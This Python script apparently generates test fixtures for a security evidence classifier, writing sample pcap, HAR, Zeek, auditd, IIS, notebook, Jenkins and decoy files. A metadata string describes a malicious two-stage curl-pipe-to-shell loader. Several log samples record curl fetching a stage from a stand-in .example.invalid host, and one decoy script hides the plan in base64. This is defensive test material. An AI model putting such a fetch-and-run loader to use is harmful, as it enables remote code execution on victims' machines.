"""evidence-magic-classifier fixtures: one member per evidence shape, written with dpkt / stdlib json / plain text
(never lib.codec). Run: python3 -I tests/data/script_fixtures/ek_gen.py tests/data/script_fixtures
then `editcap -F pcapng ek_pcap_dns.pcap ek_pcapng_dns.pcapng` for the pcapng twin."""
import base64
import json
import sys
from pathlib import Path

import dpkt

out = Path(sys.argv[1])
PLAN = ("v=3|language=bash|role=loader|verdict=malicious|attack=T1059.004|adapter=curl_pipe|stage_count=2|"
        "steps=fetch_stage,run_stage|campaign_id=EK-5d1e0b7a|url=https://ek-5d1e0b7a.example.invalid/s")

# pcap: one DNS query (dpkt writer)
dns = dpkt.dns.DNS(id=0x1234, qd=[dpkt.dns.DNS.Q(name="ek-5d1e0b7a.example.invalid", type=1, cls=1)])
udp = dpkt.udp.UDP(sport=53000, dport=53, data=bytes(dns))
udp.ulen = len(udp)
ip = dpkt.ip.IP(src=bytes([10, 0, 0, 5]), dst=bytes([10, 0, 0, 53]), p=17, data=udp)
ip.len = len(ip)
eth = dpkt.ethernet.Ethernet(src=b"\x02" * 6, dst=b"\x04" * 6, type=0x0800, data=ip)
with open(out / "ek_pcap_dns.pcap", "wb") as f:
    w = dpkt.pcap.Writer(f)
    w.writepkt(bytes(eth), ts=1792300000.0)

# HAR (stdlib json)
har = {"log": {"version": "1.2", "creator": {"name": "ek_gen", "version": "1"},
               "entries": [{"startedDateTime": "2026-10-20T10:00:00Z", "time": 1,
                            "request": {"method": "GET", "url": "https://ek-5d1e0b7a.example.invalid/s",
                                        "headers": []},
                            "response": {"status": 200, "headers": []}}]}}
(out / "ek_har_get.har").write_text(json.dumps(har))

# Zeek http.log TSV
z = ["#separator \\x09", "#set_separator\t,", "#path\thttp",
     "#fields\tts\tuid\tid.orig_h\tid.orig_p\tid.resp_h\tid.resp_p\tmethod\thost\turi",
     "#types\ttime\tstring\taddr\tport\taddr\tport\tstring\tstring\tstring",
     "1792300000.000000\tCk1\t10.0.0.5\t50000\t10.0.0.80\t80\tGET\tek-5d1e0b7a.example.invalid\t/s"]
(out / "ek_zeek_http.log").write_text("\n".join(z) + "\n")

# auditd raw records
a = ['type=SYSCALL msg=audit(1792300000.120:901): arch=c000003e syscall=59 success=yes exit=0 ppid=4000 pid=4100 '
     'auid=1000 uid=1000 comm="curl" exe="/usr/bin/curl" key="exec"',
     'type=EXECVE msg=audit(1792300000.120:901): argc=2 a0="curl" a1="https://ek-5d1e0b7a.example.invalid/s"',
     'type=PROCTITLE msg=audit(1792300000.120:901): proctitle=' +
     b"curl\x00https://ek-5d1e0b7a.example.invalid/s".hex().upper()]
(out / "ek_auditd_execve.log").write_text("\n".join(a) + "\n")

# Jupyter notebook (nbformat 4 JSON, stdlib json)
nb = {"cells": [{"cell_type": "code", "execution_count": None, "metadata": {}, "outputs": [],
                 "source": ["print('hello')\n"]}],
      "metadata": {"kernelspec": {"name": "python3", "display_name": "Python 3", "language": "python"}},
      "nbformat": 4, "nbformat_minor": 5}
(out / "ek_notebook_plain.ipynb").write_text(json.dumps(nb, indent=1))

# Jenkins credentials.xml
(out / "ek_jenkins_credentials.xml").write_text(
    "<?xml version='1.1' encoding='UTF-8'?>\n<com.cloudbees.plugins.credentials.SystemCredentialsProvider "
    "plugin=\"credentials@1337.v60b_d7b_c7b_c9f\">\n  <domainCredentialsMap class=\"hudson.util.CopyOnWriteMap$Hash\"/>\n"
    "</com.cloudbees.plugins.credentials.SystemCredentialsProvider>\n")

# W3C (IIS) log
(out / "ek_w3c_iis.log").write_text(
    "#Software: Microsoft Internet Information Services 10.0\r\n#Version: 1.0\r\n#Date: 2026-10-20 10:00:00\r\n"
    "#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port c-ip cs(User-Agent) cs-host sc-status\r\n"
    "2026-10-20 10:00:00 10.0.0.80 GET /s - 80 10.0.0.5 curl/8.5 ek-5d1e0b7a.example.invalid 200\r\n")

# DECOY: a bash member whose comment lines mimic log headers (#fields / type=SYSCALL / UID PID PPID) and that
# carries a real plan behind the D20 HUNTRESS_ANALYSIS marker -> still a script; find_codecs must decode the plan.
(out / "ek_decoy_bash_logheaders.sh").write_text(
    "#!/usr/bin/env bash\n# fields: #fields ts uid  (mimics a zeek header)\n# type=SYSCALL msg=audit(1:1) mimic\n"
    "# UID PID PPID C STIME TTY TIME CMD\n# HUNTRESS_ANALYSIS_V1:B64-" + base64.b64encode(PLAN.encode()).decode() +
    "\necho 'nothing to see'\n")

# DECOY: text named .pcap (no capture magic) -> not a pcap
(out / "ek_decoy_renamed.pcap").write_text("this is a note about a capture, not a capture\nGET / HTTP/1.1\n")
print(PLAN)
